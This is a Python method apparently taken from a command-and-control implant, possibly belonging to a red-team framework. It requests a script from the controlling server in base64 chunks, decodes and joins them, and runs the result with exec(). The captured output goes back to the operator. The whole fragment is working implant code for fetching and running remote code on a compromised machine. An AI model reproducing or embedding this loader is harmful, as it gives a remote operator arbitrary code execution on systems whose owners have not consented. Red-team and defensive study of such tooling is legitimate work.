    def load_script(self, task_id, file):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id, "status": f"downloading script chunk {chunk_num}/{total_chunks}" }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()
            
        if cmd_code: 
            from contextlib import redirect_stdout, redirect_stderr
            import io

            f = io.StringIO()

            with redirect_stdout(f), redirect_stderr(f):
                exec(cmd_code)

            return f.getvalue() if f.getvalue() else "Script executed successfully without output"
        else: 
            return "Failed to load script"